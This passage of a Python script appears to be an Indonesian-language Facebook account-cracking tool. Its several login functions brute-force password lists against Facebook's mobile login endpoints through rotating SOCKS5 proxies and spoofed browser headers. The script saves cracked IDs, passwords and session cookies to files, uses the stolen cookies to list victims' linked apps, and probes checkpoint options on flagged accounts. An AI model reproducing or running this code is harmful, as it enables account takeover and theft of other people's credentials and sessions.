				print(f'\r{Y}[HaWa🌪️😼-OK]{PU}{idf}{N}|{GR}{pw}{PU}\n {R}COOKIE : {kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_ARA(kuki)
				open('/sdcard/ARA-OK.txt','a').write(f'{idf}|{pw}\n')
				os.system('espeak -a 300 " HaWA CRACKED OK ID"')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
#d
def crackd_ARA(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write(f'\r{Y}[{Y}%sOmed{Y}]-{PU}[%s/%s]-{G}[OK:%s]{R}[CP:%s]-[%s%s]%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update = {'authority': 'd.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '1.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-A326B"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
			p = ses.get('https://d.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://d.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=1.75; wd=412x814'
			heade = {'authority': 'd.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '1.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-A326B"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
			po = ses.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{N}[Omed-CP]{R}{idf}{R}|{R}{pw}{R}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				open('/sdcard/ARA-CP.txt','a').write(f'{idf}|{pe}\n')
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{N}[Omed-OK]{G}{idf}{G}|{G}{pw}{PU}\n {PU}COOKIE : {kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_ARA(kuki)
				open('/sdcard/ARA-OK.txt','a').write(f'{idf}|{pw}\n')
				os.system('espeak -a 300 " ARA CRACKED OK ID"')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
	
	
#x
def crackx_ARA(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write(f'\r{Y}[{Y}%sOmed{Y}]-{PU}[%s/%s]-{G}[OK:%s]{R}[CP:%s]-[%s%s]%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update = {'authority': 'x.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '1.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-A326B"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
			p = ses.get('https://x.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://x.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=1.75; wd=412x814'
			heade = {'authority': 'x.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '1.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-A326B"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{N}[ARA-CP]{R}{idf}{R}|{R}{pw}{R}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				open('/sdcard/Omed-CP.txt','a').write(f'{idf}|{pe}\n')
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{N}[Omed-OK]{G}{idf}{G}|{G}{pw}{PU}\n {PU}COOKIE : {kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_ARA(kuki)
				open('/sdcard/ARA-OK.txt','a').write(f'{idf}|{pw}\n')
				os.system('espeak -a 300 " ARA CRACKED OK ID"')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
	
#p
def crackp_ARA(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write(f'\r{Y}[{Y}%sOmed{Y}]-{PU}[%s/%s]-{G}[OK:%s]{R}[CP:%s]-[%s%s]%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update = {'authority': 'p.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '1.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-A326B"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=1.75; wd=412x814'
			heade = {'authority': 'p.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '1.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-A326B"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{N}[Omed-CP]{R}{idf}{R}|{R}{pw}{R}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				open('/sdcard/ARA-CP.txt','a').write(f'{idf}|{pe}\n')
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{N}[Omed-OK]{G}{idf}{G}|{G}{pw}{PU}\n {PU}COOKIE : {kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_ARA(kuki)
				open('/sdcard/ARA-OK.txt','a').write(f'{idf}|{pw}\n')
				os.system('espeak -a 300 " ARA CRACKED OK ID"')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
	
#free
def crackfree_ARA(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write(f'\r{Y}[{Y}%sARA{Y}]-{PU}[%s/%s]-{G}[OK:%s]{R}[CP:%s]-[%s%s]%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update = {'authority': 'free.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '1.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-A326B"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=1.75; wd=412x814'
			heade = {'authority': 'free.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '1.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-A326B"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{N}[Omed-CP]{R}{idf}{R}|{R}{pw}{R}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				open('/sdcard/ARA-CP.txt','a').write(f'{idf}|{pe}\n')
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{N}[ARA-OK]{G}{idf}{G}|{G}{pw}{PU}\n {PU}COOKIE : {kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_ARA(kuki)
				open('/sdcard/ARA-OK.txt','a').write(f'{idf}|{pw}\n')
				os.system('espeak -a 300 " ARA CRACKED OK ID"')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
	
	
def cek_ARA(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))
#--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
def ceker(idf,pw):
	global cp
	ua = random.choice(ugen)
	headers = {'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '1.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-A326B"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(x+'['+h+'•'+x+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = random.choice(ugen)
			ses = requests.Session()
			headers = {'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '1.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-A326B"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
                                                       
#-----------------------[ SYSTEM-CONTROL ]--------------------#m
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()
